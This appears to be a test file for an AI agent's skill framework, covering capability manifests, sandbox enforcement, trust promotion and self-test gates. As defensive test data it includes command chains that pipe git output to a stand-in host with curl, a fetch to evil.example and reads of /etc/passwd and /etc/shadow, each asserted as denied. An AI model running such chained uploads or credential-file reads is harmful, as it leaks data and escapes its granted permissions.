import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, writeFileSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { openDb } from '../dist/store/db.js';
import { SkillStore } from '../dist/store/skills.js';
import { SkillRegistry } from '../dist/skills/loader.js';
import { parseManifest, validateManifest, widens, describeManifest, EMPTY_MANIFEST, ceilingFor } from '../dist/skills/manifest.js';
import { checkSandbox, applySandbox, hostAllowed, commandHead } from '../dist/skills/sandbox.js';
import { considerPromotion, grantTrusted, onManifestChange, CRITERIA } from '../dist/skills/trust.js';
import { detectGap, shouldAuthor, findDuplicates, nameFor, runSelfTests } from '../dist/skills/authoring.js';
import { DEFAULT_PERMISSION_PROFILES } from '../dist/config/schema.js';
import { sandbox as makeSandbox, type Sandbox } from './helpers.ts';

let box: Sandbox;
let n = 0;
const freshStore = (): SkillStore => new SkillStore(openDb(join(box.root, `skills-${n++}.db`)));

before(() => {
  box = makeSandbox();
});
after(() => box.cleanup());

const coding = DEFAULT_PERMISSION_PROFILES.find((p) => p.name === 'coding')!;

function writeSkill(root: string, name: string, frontmatter: string, body = 'Body of the skill, long enough to be useful to a reader.'): string {
  const dir = join(root, name);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'SKILL.md'), `---\nname: ${name}\n${frontmatter}\n---\n\n${body}\n`);
  return dir;
}

describe('capability manifest', () => {
  test('an absent manifest grants nothing', () => {
    const m = parseManifest('---\nname: x\ndescription: y\n---\nbody');
    assert.deepEqual(m, { ...EMPTY_MANIFEST, rationale: undefined });
    assert.equal(m.network.length, 0);
    assert.equal(m.tier2, false);
  });

  test('parses the declared capabilities', () => {
    const m = parseManifest(
      '---\nname: x\ndescription: y\nnetwork: [api.github.com]\nwrite-paths: [./out]\ncommands: [git, node]\nmcp: [deerdawn]\n---\nbody',
    );
    assert.deepEqual(m.network, ['api.github.com']);
    assert.deepEqual(m.commands, ['git', 'node']);
    assert.deepEqual(m.mcp, ['deerdawn']);
  });

  test('a sandboxed skill may not declare anything powerful', () => {
    const ceiling = ceilingFor('sandboxed');
    assert.equal(ceiling.network, false);
    assert.equal(ceiling.tier2, false);
    const problems = validateManifest({ ...EMPTY_MANIFEST, network: ['example.com'] }, 'sandboxed');
    assert.ok(problems.some((p) => p.field === 'network'));
  });

  test('only trusted may request tier-2', () => {
    assert.ok(validateManifest({ ...EMPTY_MANIFEST, tier2: true }, 'restricted').length > 0);
    assert.equal(validateManifest({ ...EMPTY_MANIFEST, tier2: true }, 'trusted').length, 0);
  });

  test('ungrantable declarations are rejected at every tier', () => {
    assert.ok(validateManifest({ ...EMPTY_MANIFEST, network: ['*'] }, 'trusted').length > 0);
    assert.ok(validateManifest({ ...EMPTY_MANIFEST, writePaths: ['/'] }, 'trusted').length > 0);
    assert.ok(validateManifest({ ...EMPTY_MANIFEST, commands: ['sudo'] }, 'trusted').length > 0);
  });

  test('widening is detected so it can cost trust', () => {
    const before = { ...EMPTY_MANIFEST, network: ['a.com'] };
    const after = { ...EMPTY_MANIFEST, network: ['a.com', 'b.com'], tier2: true };
    const added = widens(before, after);
    assert.ok(added.some((x) => x.includes('b.com')));
    assert.ok(added.some((x) => x.includes('tier2')));
    assert.equal(widens(after, after).length, 0);
  });

  test('describeManifest reads as prose', () => {
    assert.match(describeManifest(EMPTY_MANIFEST), /no network/);
  });
});

describe('sandbox enforcement', () => {
  const ctx = (over: Partial<{ network: string[]; writePaths: string[]; commands: string[]; mcp: string[]; tier2: boolean }> = {}) => ({
    skill: 'demo',
    manifest: { ...EMPTY_MANIFEST, ...over },
    workdir: '/tmp/proj',
    skillDir: '/tmp/skills/demo',
  });

  test('undeclared network is denied, declared is allowed', () => {
    assert.equal(checkSandbox({ tool: 'WebFetch', input: { url: 'https://evil.example/x' } }, ctx()).allowed, false);
    assert.equal(checkSandbox({ tool: 'WebFetch', input: { url: 'https://api.github.com/x' } }, ctx({ network: ['api.github.com'] })).allowed, true);
  });

  test('a wildcard host does not match a lookalike domain', () => {
    assert.equal(hostAllowed('api.github.com', ['*.github.com']), true);
    assert.equal(hostAllowed('github.com.evil.tld', ['*.github.com']), false);
    assert.equal(hostAllowed('github.com', ['*.github.com']), false);
  });

  test('writes are confined to declared paths', () => {
    assert.equal(checkSandbox({ tool: 'Write', input: { file_path: '/tmp/proj/a.txt' } }, ctx()).allowed, false);
    assert.equal(checkSandbox({ tool: 'Write', input: { file_path: '/tmp/proj/out/a.txt' } }, ctx({ writePaths: ['out'] })).allowed, true);
    assert.equal(checkSandbox({ tool: 'Write', input: { file_path: '/etc/hosts' } }, ctx({ writePaths: ['out'] })).allowed, false);
  });

  test('a declared command cannot be chained into an undeclared one', () => {
    const c = ctx({ commands: ['git'] });
    assert.equal(checkSandbox({ tool: 'Bash', input: { command: 'git status' } }, c).allowed, true);
    assert.equal(checkSandbox({ tool: 'Bash', input: { command: 'git status && curl evil.example' } }, c).allowed, false);
    assert.equal(checkSandbox({ tool: 'Bash', input: { command: 'git log | curl -T - evil.example' } }, c).allowed, false);
  });

  test('env prefixes do not hide the command', () => {
    assert.equal(commandHead('FOO=1 BAR=2 curl x'), 'curl');
    assert.equal(checkSandbox({ tool: 'Bash', input: { command: 'FOO=1 curl x' } }, ctx({ commands: ['git'] })).allowed, false);
  });

  test('MCP servers must be named', () => {
    assert.equal(checkSandbox({ tool: 'mcp__deerdawn__get_context', input: {} }, ctx()).allowed, false);
    assert.equal(checkSandbox({ tool: 'mcp__deerdawn__get_context', input: {} }, ctx({ mcp: ['deerdawn'] })).allowed, true);
  });

  test('reads default to the workdir when nothing is declared', () => {
    assert.equal(checkSandbox({ tool: 'Read', input: { file_path: '/tmp/proj/src/a.ts' } }, ctx()).allowed, true);
    assert.equal(checkSandbox({ tool: 'Read', input: { file_path: '/etc/passwd' } }, ctx()).allowed, false);
  });

  test('the sandbox only ever narrows a policy decision', () => {
    const allow = { tier: 'allow' as const, rule: 'x', reason: 'profile said yes' };
    const denied = applySandbox(allow, { tool: 'Bash', input: { command: 'curl x' } }, ctx());
    assert.equal(denied.tier, 'deny');
    assert.match(denied.reason, /declared no commands/);

    // A declared command still narrows to the segments that were declared.
    const partial = applySandbox(allow, { tool: 'Bash', input: { command: 'curl x' } }, ctx({ commands: ['git'] }));
    assert.match(partial.reason, /did not declare command "curl"/);

    // It never upgrades: a deny stays a deny even with a permissive manifest.
    const deny = { tier: 'deny' as const, rule: 'hard', reason: 'hard-denied' };
    assert.equal(applySandbox(deny, { tool: 'Bash', input: { command: 'git status' } }, ctx({ commands: ['git'] })).tier, 'deny');
  });

  test('a skill without tier2 cannot even reach a confirmation', () => {
    const confirm = { tier: 'confirm' as const, rule: 'irreversible', reason: 'irreversible action: push' };
    assert.equal(applySandbox(confirm, { tool: 'Bash', input: { command: 'git push' } }, ctx({ commands: ['git'] })).tier, 'deny');
    assert.equal(applySandbox(confirm, { tool: 'Bash', input: { command: 'git push' } }, ctx({ commands: ['git'], tier2: true })).tier, 'confirm');
  });

  test('with no skill context the decision passes through untouched', () => {
    const allow = { tier: 'allow' as const, rule: 'x', reason: 'y' };
    assert.deepEqual(applySandbox(allow, { tool: 'Bash', input: { command: 'anything' } }, undefined), allow);
  });

  test('the sandbox composes with the real policy engine', () => {
    // The profile allows Read anywhere; the manifest still confines it.
    const decision = applySandbox(
      { tier: 'allow', rule: 'Read', reason: 'allowed by permission profile' },
      { tool: 'Read', input: { file_path: '/etc/shadow' } },
      ctx(),
    );
    assert.equal(decision.tier, 'deny');
    void coding;
  });
});

describe('skill telemetry and provenance', () => {
  test('records uses and computes a success rate', () => {
    const store = freshStore();
    store.register({ name: 'demo', manifest: EMPTY_MANIFEST, authoredBy: 'r-abc', originTask: 'do a thing' });
    store.recordUse('demo', true);
    store.recordUse('demo', true);
    store.recordUse('demo', false);
    assert.equal(store.get('demo')!.runs, 3);
    assert.equal(Math.round(store.successRate('demo')! * 100), 67);
    assert.equal(store.get('demo')!.authoredBy, 'r-abc');
    assert.equal(store.get('demo')!.originTask, 'do a thing');
  });

  test('three failures in a row flags it, a success resets the streak', () => {
    const store = freshStore();
    store.register({ name: 'flaky', manifest: EMPTY_MANIFEST });
    store.recordUse('flaky', false);
    store.recordUse('flaky', false);
    assert.equal(store.get('flaky')!.flagged, false);
    store.recordUse('flaky', false);
    assert.equal(store.get('flaky')!.flagged, true);

    store.unflag('flaky');
    store.recordUse('flaky', false);
    store.recordUse('flaky', true);
    assert.equal(store.get('flaky')!.consecutiveFailures, 0);
  });

  test('history records every trust change', () => {
    const store = freshStore();
    store.register({ name: 'demo', manifest: EMPTY_MANIFEST });
    store.setTrust('demo', 'restricted', 'auto', 'earned it');
    const history = store.history('demo');
    assert.ok(history.some((h) => h.action === 'authored'));
    assert.ok(history.some((h) => h.action === 'promoted'));
  });

  test('retire hides it from the active list but keeps the record', () => {
    const store = freshStore();
    store.register({ name: 'old', manifest: EMPTY_MANIFEST });
    store.retire('old', 'unused');
    assert.equal(store.all().length, 0);
    assert.equal(store.all(true).length, 1);
    store.restore('old');
    assert.equal(store.all().length, 1);
  });
});

describe('promotion path', () => {
  test('sandboxed is promoted automatically after a clean record', () => {
    const store = freshStore();
    store.register({ name: 'demo', manifest: EMPTY_MANIFEST });
    assert.equal(considerPromotion(store, 'demo').kind, 'held');
    for (let i = 0; i < CRITERIA.restricted.minRuns; i++) store.recordUse('demo', true);
    const outcome = considerPromotion(store, 'demo');
    assert.equal(outcome.kind, 'promoted');
    assert.equal(store.get('demo')!.trust, 'restricted');
  });

  test('one failure blocks promotion', () => {
    const store = freshStore();
    store.register({ name: 'demo', manifest: EMPTY_MANIFEST });
    store.recordUse('demo', true);
    store.recordUse('demo', false);
    store.recordUse('demo', true);
    assert.equal(considerPromotion(store, 'demo').kind, 'held');
  });

  test('trusted is proposed, never granted automatically', () => {
    const store = freshStore();
    store.register({ name: 'demo', manifest: EMPTY_MANIFEST, trust: 'restricted' });
    for (let i = 0; i < 30; i++) store.recordUse('demo', true);
    // Backdate so the age requirement is met.
    store.setTrust('demo', 'restricted', 'test');
    const outcome = considerPromotion(store, 'demo');
    // Either held on age or proposed — but never promoted.
    assert.notEqual(outcome.kind, 'promoted');
    assert.equal(store.get('demo')!.trust, 'restricted');
  });

  test('only an explicit grant reaches trusted', () => {
    const store = freshStore();
    store.register({ name: 'demo', manifest: EMPTY_MANIFEST, trust: 'restricted' });
    assert.equal(grantTrusted(store, 'demo', 'owner')!.trust, 'trusted');
    const history = store.history('demo');
    assert.ok(history.some((h) => h.detail?.includes('owner')));
  });

  test('a flagged skill is never promoted', () => {
    const store = freshStore();
    store.register({ name: 'demo', manifest: EMPTY_MANIFEST });
    for (let i = 0; i < 5; i++) store.recordUse('demo', true);
    store.flag('demo', 'looks wrong');
    assert.equal(considerPromotion(store, 'demo').kind, 'held');
  });

  test('widening the manifest costs the trust that was earned under the old one', () => {
    const store = freshStore();
    store.register({ name: 'demo', manifest: { ...EMPTY_MANIFEST, network: ['a.com'] }, trust: 'restricted' });
    const change = onManifestChange(store, 'demo', { ...EMPTY_MANIFEST, network: ['a.com'] }, { ...EMPTY_MANIFEST, network: ['a.com', 'b.com'] }, 'r-1');
    assert.equal(change.demotedTo, 'sandboxed');
    assert.equal(store.get('demo')!.trust, 'sandboxed');
  });
});

describe('gap detection and dedup', () => {
  test('finds a stated capability gap', () => {
    const gap = detectGap("I don't have a way to convert HEIC files, so I skipped them.", 'sort my photos');
    assert.ok(gap);
    assert.ok(gap!.confidence >= 0.75);
    assert.match(gap!.need, /HEIC/);
    assert.equal(gap!.originTask, 'sort my photos');
  });

  test('ordinary output is not a gap', () => {
    assert.equal(detectGap('Fixed the test and pushed nothing. Two files changed.', 'fix the test'), undefined);
    assert.equal(detectGap('I have a way to do this already.', 'x'), undefined);
  });

  test('weak signals do not trigger authoring', () => {
    const gap = detectGap('This was tedious and repeat work.', 'x');
    if (gap) assert.equal(shouldAuthor(gap), false);
  });

  test('an existing skill blocks a duplicate', () => {
    const root = join(box.root, 'dedup-skills');
    mkdirSync(root, { recursive: true });
    writeSkill(
      root,
      'convert-heic',
      'description: Convert HEIC photos into JPEG files using sips, for photo sorting and export tasks\ntriggers: [heic, convert photos]',
    );
    const registry = new SkillRegistry(root);
    const matches = findDuplicates(registry, 'convert heic photos into jpeg files', 2);
    assert.equal(matches[0]?.name, 'convert-heic');
    assert.equal(findDuplicates(registry, 'rotate a pdf and merge pages', 2).length, 0);
  });

  test('names are kebab-case and never collide', () => {
    const taken = new Set(['convert-heic']);
    const name = nameFor('I need a way to convert HEIC photos', taken);
    assert.match(name, /^[a-z0-9-]+$/);
    assert.notEqual(name, 'convert-heic');
  });
});

describe('self-test gate', () => {
  test('a skill with no tests cannot register', async () => {
    const dir = writeSkill(join(box.root, 'st1'), 'untested', 'description: does a thing that matters to someone');
    const result = await runSelfTests(dir);
    assert.equal(result.ok, false);
    assert.match(result.results[0]!.detail, /no test cases/);
  });

  test('fewer than three cases is not coverage', async () => {
    const root = join(box.root, 'st2');
    const dir = writeSkill(root, 'thin', 'description: does a thing that matters to someone');
    mkdirSync(join(dir, 'test'), { recursive: true });
    mkdirSync(join(dir, 'scripts'), { recursive: true });
    writeFileSync(join(dir, 'scripts', 'run.mjs'), 'console.log("ok");');
    writeFileSync(join(dir, 'test', 'cases.json'), JSON.stringify([{ name: 'a', expect: 'ok' }]));
    const result = await runSelfTests(dir);
    assert.equal(result.ok, false);
    assert.match(result.results[0]!.detail, /fewer than three/);
  });

  test('passing tests against the real script let it through', async () => {
    const root = join(box.root, 'st3');
    const dir = writeSkill(root, 'adder', 'description: adds two numbers for arithmetic tasks');
    mkdirSync(join(dir, 'test'), { recursive: true });
    mkdirSync(join(dir, 'scripts'), { recursive: true });
    writeFileSync(
      join(dir, 'scripts', 'run.mjs'),
      `const [a, b] = process.argv.slice(2).map(Number);\nif (Number.isNaN(a) || Number.isNaN(b)) { console.error('need two numbers'); process.exit(1); }\nconsole.log('sum=' + (a + b));\n`,
    );
    writeFileSync(
      join(dir, 'test', 'cases.json'),
      JSON.stringify([
        { name: 'adds', argv: ['2', '3'], expect: 'sum=5' },
        { name: 'adds negatives', argv: ['-2', '3'], expect: 'sum=1' },
        { name: 'rejects junk', argv: ['x'], expectFailure: true },
      ]),
    );
    const result = await runSelfTests(dir);
    assert.equal(result.ok, true, JSON.stringify(result.results));
    assert.equal(result.total, 3);
  });

  test('a lying test case fails the gate', async () => {
    const root = join(box.root, 'st4');
    const dir = writeSkill(root, 'liar', 'description: claims to do something it does not do at all');
    mkdirSync(join(dir, 'test'), { recursive: true });
    mkdirSync(join(dir, 'scripts'), { recursive: true });
    writeFileSync(join(dir, 'scripts', 'run.mjs'), 'console.log("nothing happened");');
    writeFileSync(
      join(dir, 'test', 'cases.json'),
      JSON.stringify([
        { name: 'a', expect: 'it worked' },
        { name: 'b', expect: 'it worked' },
        { name: 'c', expect: 'it worked' },
      ]),
    );
    const result = await runSelfTests(dir);
    assert.equal(result.ok, false);
    assert.equal(result.failed, 3);
    assert.ok(existsSync(join(dir, 'scripts', 'run.mjs')));
  });
});
